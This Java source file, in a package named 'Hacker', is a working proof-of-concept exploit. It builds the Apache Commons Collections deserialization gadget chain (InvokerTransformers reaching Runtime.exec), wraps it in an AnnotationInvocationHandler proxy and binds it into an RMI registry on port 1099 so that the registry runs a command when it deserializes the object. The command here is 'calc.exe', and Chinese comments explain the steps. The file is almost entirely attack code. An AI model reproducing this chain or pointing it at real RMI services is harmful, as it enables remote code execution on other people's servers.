package Hacker;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

public class hackerServer {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        hackerServer hacker = new hackerServer();
        Remote payload = (Remote) hacker.test();

        Registry myRegistry = LocateRegistry.getRegistry(1099);

        myRegistry.rebind("hacker",  payload);
    }


    public Object test() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        Transformer chain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
//        innerMap.put("foo","bar");//不行，key要为value
        innerMap.put("value","bar");
        Map outerMap = TransformedMap.decorate(innerMap, null, chain);
        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //访问权限放开，private之类的也能调用
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        Object instance = ctor.newInstance(Target.class ,outerMap);
        Remote payload = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, (InvocationHandler) instance));
        return payload;
    }

}
